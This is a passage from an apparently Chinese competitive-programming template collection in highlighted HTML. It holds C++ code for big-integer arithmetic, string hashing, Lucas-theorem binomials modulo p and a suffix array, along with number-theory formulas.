punctuation">;</span>        c<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>len<span class="token punctuation">,</span> b<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>len <span class="token operator">&lt;=</span> i<span class="token punctuation">)</span> c<span class="token punctuation">.</span>len <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        bign c <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span><span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>        bign c<span class="token punctuation">;</span>        c<span class="token punctuation">.</span>len <span class="token operator">=</span> len <span class="token operator">+</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%=</span> <span class="token number">10</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>        bign c <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">,</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            a <span class="token operator">=</span> a<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            a <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token operator">*</span>j<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        c<span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>        bign a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            a <span class="token operator">=</span> a<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token operator">*</span>j<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">+</span> b<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">!=</span> b<span class="token punctuation">.</span>len<span class="token punctuation">)</span> <span class="token keyword">return</span> len <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">&lt;=</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">>=</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">&lt;</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">!=</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">||</span> <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">&lt;</span> b<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span>b <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>b <span class="token operator">></span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    string <span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> s<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token char">'0'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>istream<span class="token operator">&amp;</span> <span class="token keyword">operator</span> <span class="token operator">>></span> <span class="token punctuation">(</span>istream<span class="token operator">&amp;</span> in<span class="token punctuation">,</span> bign<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    string s<span class="token punctuation">;</span>    in <span class="token operator">>></span> s<span class="token punctuation">;</span>    x <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> in<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ostream<span class="token operator">&amp;</span> <span class="token keyword">operator</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>ostream<span class="token operator">&amp;</span> out<span class="token punctuation">,</span> <span class="token keyword">const</span> bign<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    out <span class="token operator">&lt;&lt;</span> x<span class="token punctuation">.</span><span class="token function">str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> out<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    bign sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>t<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin <span class="token operator">>></span> t<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>len<span class="token operator">==</span><span class="token number">1</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span>t<span class="token punctuation">.</span>d<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        sum<span class="token operator">+=</span>t<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>sum<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="20-字符串哈希"><a href="#20-字符串哈希" class="headerlink" title="20. 字符串哈希"></a>20. 字符串哈希</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* * 自然溢出字符串哈希 * 可用于字符串判重，或利用字符串单调性结合二分解决问题 */</span><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> ulint<span class="token punctuation">;</span><span class="token keyword">const</span> ulint seed <span class="token operator">=</span> <span class="token number">50009uLL</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">maxn</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">100010</span><span class="token punctuation">)</span></span></span>ulint xp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> H<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">init_xp</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    xp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        xp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> xp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> seed<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">init_hash</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    H<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        H<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> H<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> seed <span class="token operator">+</span> <span class="token punctuation">(</span>ulint<span class="token punctuation">)</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'a'</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">ask_hash</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> H<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> H<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">-</span> H<span class="token punctuation">[</span>l<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> xp<span class="token punctuation">[</span>r <span class="token operator">-</span> l <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="21-数学公式"><a href="#21-数学公式" class="headerlink" title="21. 数学公式"></a>21. 数学公式</h3><h4 id="21-1-莫比乌斯反演"><a href="#21-1-莫比乌斯反演" class="headerlink" title="21.1 莫比乌斯反演"></a>21.1 莫比乌斯反演</h4><p><em>1</em>. 如果有$f(n)=\sum<em>{d\mid n}g(d)$, 则有 $g(n)=\sum</em>{d\mid n}{\mu(d)f(\frac{n}{d})}$</p><p><em>2</em>. $\sum_{d\mid n}{\mu(d)}=[n=1]$</p><p><em>3</em>. $\varphi(n)=\sum_{d\mid n}{\mu(d)\frac{d}{n}}$</p><h4 id="21-2-关于欧拉函数的一些公式"><a href="#21-2-关于欧拉函数的一些公式" class="headerlink" title="21.2 关于欧拉函数的一些公式"></a>21.2 关于欧拉函数的一些公式</h4><p><em>1</em>. $n=\sum_{d\mid n}\varphi(d)$</p><p><em>2</em>. $\sum_{i=1}^{n}{[gcd(i,n)=1]\cdot i}=\frac{n\cdot \varphi(n)+[n=1]}{2}$</p><p><em>3.</em> $\sum_{i=1}^{n}{gcd[i,j]}$</p><h4 id="21-3-组合数取模"><a href="#21-3-组合数取模" class="headerlink" title="21.3 组合数取模"></a>21.3 组合数取模</h4><p><em>1.</em>  $1\leq m\leq n\leq 1000$和$1\leq p\leq 10^9$的情况</p><p>​    使用预处理+取模即可。</p><p><em>2.</em> $1\leq m\leq n\leq 10^{18}$和$1\leq p\leq 10^9$的情况</p><p>使用Lucas定理，定理描述是，如果</p><p>$n = {n<em>k}p^k + n</em>{k-1}p^{k-1} + …. + {n_1}p + {n_0}$</p><p>$m = {m<em>k}p^k + {m</em>{k-1}}p^{k-1} + \cdots + {m_1}p + {m_0}$</p><p>那么得到 $C<em>{n}^{m} = \prod</em>{i=1}^{k}C_{n_i}^{m_i}\pmod p$</p><p>这样分别求，采用逆元计算。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">ll <span class="token function">C</span><span class="token punctuation">(</span>ll n<span class="token punctuation">,</span>ll p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    ll ans <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ll a <span class="token operator">=</span> <span class="token punctuation">(</span>n<span class="token operator">+</span>i<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span>  <span class="token comment">//逐项求解</span>        ll b <span class="token operator">=</span> i <span class="token operator">%</span> p<span class="token punctuation">;</span>        ans <span class="token operator">=</span> ans<span class="token operator">*</span><span class="token punctuation">(</span>a<span class="token operator">*</span><span class="token function">ksm</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>p<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> ans<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//以下是在p在1e5之内的时候使用阶乘预处理</span><span class="token comment">//需要注意的是该预处理只对于相应的模数p生效</span><span class="token comment">//一般需要预处理的题目是要预处理多组阶乘</span><span class="token comment">//例如限制了p为素数或其他的时候可以使用</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1e5</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span>ll fac<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">facinit</span><span class="token punctuation">(</span>ll p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    fac<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i <span class="token operator">&lt;=</span> p<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    fac<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> fac<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">*</span>i<span class="token operator">%</span>p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">C</span><span class="token punctuation">(</span>ll n<span class="token punctuation">,</span>ll m<span class="token punctuation">)</span>  <span class="token comment">//阶乘预处理之后的方法</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> fac<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">*</span><span class="token function">inv</span><span class="token punctuation">(</span>fac<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token operator">*</span>fac<span class="token punctuation">[</span>n<span class="token operator">-</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>ll <span class="token function">Lucas</span><span class="token punctuation">(</span>ll n<span class="token punctuation">,</span>ll m<span class="token punctuation">)</span> <span class="token comment">//直接使用这个函数返回答案</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">C</span><span class="token punctuation">(</span>n<span class="token operator">%</span>p<span class="token punctuation">,</span>m<span class="token operator">%</span>p<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">Lucas</span><span class="token punctuation">(</span>n<span class="token operator">/</span>p<span class="token punctuation">,</span>m<span class="token operator">/</span>p<span class="token punctuation">)</span><span class="token operator">%</span>p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="22-后缀数组"><a href="#22-后缀数组" class="headerlink" title="22. 后缀数组"></a>22. 后缀数组</h3><p><em>1</em>.不同子串的数目: </p><p>$\sum<em>{i=0}^{n-1}{(n-p[i])}-\sum</em>{i=0}^{n-1}{lcp[i]}=\frac{n^2+n}{2}-\sum_{i=0}^{n-2}{lcp[i]}$</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* * 后缀数组 * 后缀数组的倍增构造法 * 复杂度为O(nlogn) *  * 从 sa[i] 开始得后缀排在i个 * 从 i 开始得后缀排名为 rank[i] * height[i] 表示 sa[i-1] 和sa[i] 的最长公共前缀长度 */</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">1e6</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">cmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> r<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">[</span>a <span class="token operator">+</span> l<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b <span class="token operator">+</span> l<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> ta<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> tb<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token 